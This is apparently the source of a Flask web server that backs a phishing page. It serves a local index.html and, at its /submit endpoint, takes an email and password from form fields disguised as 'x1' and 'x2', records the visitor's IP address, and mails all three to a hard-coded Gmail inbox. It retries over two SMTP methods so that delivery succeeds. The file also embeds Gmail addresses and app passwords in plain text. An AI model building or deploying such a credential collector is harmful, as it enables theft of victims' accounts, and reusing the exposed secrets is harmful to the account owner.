# from flask import Flask, request, jsonify
# from flask_cors import CORS
# import smtplib
# from email.message import EmailMessage

# app = Flask(__name__)
# CORS(app)  # Allow requests from your frontend



# # Configuration
# EMAIL_SENDER = 'nwekee125@gmail.com'
# EMAIL_PASSWORD = 'wkxefsuonoulinca'  # Use a Gmail app password, not your real password
# EMAIL_RECEIVER = 'maxwell202201@gmail.com'


# @app.route('/submit', methods=['POST'])
# def submit():
#     email = request.form.get('x1')  # This is the email from the frontend
#     password = request.form.get('x2')
#     ip_address = request.remote_addr

#     # Compose email
#     msg = EmailMessage()
#     msg['Subject'] = 'New Form Submission (Student Project)'
#     msg['From'] = EMAIL_SENDER
#     msg['To'] = EMAIL_RECEIVER
#     msg.set_content(f"""
#     Email: {email}
#     Password: {password}
#     IP Address: {ip_address}
#     """)

#     # Send email
#     try:
#         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
#             smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
#             smtp.send_message(msg)
#         return jsonify({'status': 'success'})
#     except Exception as e:
#         return jsonify({'status': 'error', 'message': str(e)}), 500


# if __name__ == '__main__':
#     app.run(debug=True)

from flask import Flask, request, jsonify, send_from_directory, make_response
from flask_cors import CORS
import smtplib
from email.message import EmailMessage
import os
import mimetypes

app = Flask(__name__)
CORS(app)

# Disable caching to always return 200 responses
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Configuration - Use environment variables for production
EMAIL_SENDER = os.getenv('EMAIL_SENDER', 'nwekee125@gmail.com')
EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD', 'mhhihywubresapns')
EMAIL_RECEIVER = os.getenv('EMAIL_RECEIVER', 'maxwell202201@gmail')

@app.route('/')
def index():
    response = make_response(send_from_directory('.', 'index.html'))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/favicon.ico')
def favicon():
    # Return a simple 1x1 transparent PNG as favicon to prevent 404
    response = make_response(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82')
    response.headers['Content-Type'] = 'image/png'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/<path:filename>')
def serve_static(filename):
    response = make_response(send_from_directory('.', filename))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/submit', methods=['POST'])
def submit():
    try:
        email = request.form.get('x1')
        password = request.form.get('x2')
        ip_address = request.remote_addr
        
        print(f"Received submission - Email: {email}, IP: {ip_address}")
        
        # Basic validation
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password are required'}), 400

        # Compose the email
        msg = EmailMessage()
        msg['Subject'] = 'New Form Submission (Student Project)'
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg.set_content(f"""
    Email: {email}
    Password: {password}
    IP Address: {ip_address}
    """)
        
        print("Attempting to send email...")
        
        # Try multiple SMTP methods
        try:
            # Method 1: Try SMTP_SSL with longer timeout
            print("Trying SMTP_SSL method...")
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30) as smtp:
                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                smtp.send_message(msg)
                print("Email sent successfully via SMTP_SSL!")
                return jsonify({'status': 'success'})
        except Exception as e1:
            print(f"SMTP_SSL failed: {e1}")
            
        try:
            # Method 2: Try regular SMTP with STARTTLS
            print("Trying SMTP with STARTTLS method...")
            with smtplib.SMTP('smtp.gmail.com', 587, timeout=30) as smtp:
                smtp.starttls()
                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                smtp.send_message(msg)
                print("Email sent successfully via STARTTLS!")
                return jsonify({'status': 'success'})
        except Exception as e2:
            print(f"STARTTLS failed: {e2}")
            
        # If both methods fail, return the error
        return jsonify({
            'status': 'error', 
            'message': 'Could not connect to Gmail SMTP. Please check your internet connection or firewall settings.'
        }), 500
            
    except Exception as e:
        print(f"General Error: {e}")
        return jsonify({'status': 'error', 'message': f'Server error: {str(e)}'}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
